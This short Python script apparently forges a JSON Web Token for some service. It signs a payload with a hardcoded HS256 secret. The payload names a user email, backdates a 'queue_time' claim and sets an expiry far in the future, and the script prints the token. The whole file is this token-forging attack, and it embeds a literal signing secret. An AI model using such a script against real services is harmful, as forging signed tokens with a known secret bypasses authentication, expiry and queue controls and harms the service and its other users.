import jwt

payload = {
    "user_id": "vv@gmail.com",
    "queue_time": 1000000000.0,  # old queue time
    "exp": 5348085245            # far in future
}

secret = "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
